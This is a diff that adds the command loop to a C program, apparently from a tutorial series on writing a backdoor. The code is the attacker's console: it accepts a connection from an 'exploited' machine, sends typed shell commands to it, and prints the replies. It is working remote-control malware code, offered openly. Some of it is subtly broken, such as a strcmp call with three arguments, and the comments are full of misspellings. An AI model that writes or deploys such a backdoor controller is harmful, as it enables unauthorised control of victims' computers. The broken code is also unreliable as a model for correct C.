@@ -69,5 +69,53 @@ int main()
     client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
 
 
+    //Now let's move to while loop to iterate some tasks and actually send the commands.
+    //while 1 denootes true.
+    while (1)
+    {
+        //let's start adding jump like we did earlier in backdoor program.
+        jump:
+        //Now eeed to bzero all the variables that we speccify earlier.
+        //No need to specify bzero because server program running on linux machine if progarm want to run in windows need to specify the bzero function.
+        bzero(&buffer, sizeof(buffer));
+        //Memory location of the variable and the size of the variable.
+        bzero(&response, sizeof(response));
+
+        //Let's open a command input pallette to enter the command as a argument for the exploited system.
+        //Want to add a IP address of targeted system into it.
+        printf("Exploited ~ BY BHO ~ $: %s ", inet_ntoa(client_address.sin_addr));
+
+        //Now need to input a command and  want to store it.
+        //fgets function store it in a buffer.
+        //stdin use case : Want to get the input from standard input lib.
+        fgets(buffer, sizeof(buffer), stdin);
+
+        //After getting the input want to perfoam string manipulation in the program.
+        //using strtok function can perfoam above operation by specifing command argument buffer and the wanted character.
+        strtok(buffer, "\n");
+
+        //Now need to send the command to the target.
+        //Using write function with client socket and buffer can perfoam above opearation.
+        write(client_socket, buffer, sizeof(buffer));
+
+
+        //If buffer specify q option want to terminate the session.
+        if (strcmp("q", buffer, 1) == 0)
+        {
+            //No need WSA cleanup here for the process termination because the program is running on the linux environment.
+            break;
+        }
+        //Now need to receive the response from the target. 
+        //Perfoam inside else that.
+        else
+        {   
+            //'recv' function takes client socket and response and size of the reponse and flag.
+            //'MSG_WAITALL' flag specify block the operation until full request was satisfied.
+            recv(client_socket, response, sizeof(response), MSG_WAITALL);
+
+            //Print the response on the attacker screen.
+            printf("%s", response);
+        }
+    }
 
 }
